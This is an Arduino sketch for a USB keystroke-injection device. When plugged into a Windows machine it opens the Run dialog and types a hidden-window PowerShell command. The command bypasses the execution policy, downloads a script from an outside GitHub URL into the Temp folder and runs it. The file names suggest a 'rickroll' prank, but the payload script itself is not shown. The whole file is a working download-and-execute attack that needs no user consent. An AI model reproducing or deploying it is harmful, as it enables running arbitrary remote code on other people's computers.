#include <Keyboard.h>
void setup() {
  delay(3000);
  // Press Windows + R
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();
  // Wait for run window
  delay(500);
  // Type command
  Keyboard.print(
    "PowerShell.exe -WindowStyle Hidden Set-ExecutionPolicy Bypass -scope Process -Force; & iwr -uri 'https://raw.githubusercontent.com/CyberSpooon/GetRicked/main/scheduletherickoning.ps1' -o 'C:\\Windows\\Temp\\sch.ps1'; & 'C:\\Windows\\Temp\\sch.ps1'"
  );
  delay(900);
  // Press Enter
  Keyboard.press(KEY_RETURN);  
  Keyboard.release(KEY_RETURN);
}
void loop() {
}
